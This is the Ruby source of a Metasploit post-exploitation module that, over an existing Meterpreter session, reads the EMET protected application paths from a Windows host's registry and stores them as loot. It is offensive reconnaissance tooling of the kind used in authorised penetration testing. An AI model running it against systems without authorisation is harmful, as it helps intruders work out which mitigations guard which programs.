##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Windows Gather EMET Protected Paths',
        'Description'   => %q{ This module will enumerate the EMET protected paths on the target host.},
        'License'       => MSF_LICENSE,
        'Author'        => [ 'vysec <vincent.yiu[at]mwrinfosecurity.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))

  end

  # Run Method for when run command is issued
  def run
    print_status("Running module against #{sysinfo['Computer']}")
    
    if sysinfo['Architecture'] =~ /x64/
        print_status("The underlying OS is 64 bit")
        if client.platform =~ /x86/
          print_error("You are in a 32 bit process, migrate to 64 bit and try again.")
        end
    end
    
    isadmin = is_admin?

    #a = registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion')
    reg_vals = registry_enumvals('HKLM\\SOFTWARE\\Microsoft\\EMET\\AppSettings')
    
    t = ""

    reg_vals.each do |x|
        t << "#{x}\r\n"
    end

    puts t

    p = store_loot("host.emet_paths", "text/plain", session, t, "emet_paths.txt", "EMET Paths")
    print_status("Results stored in: #{p}")
  end

end
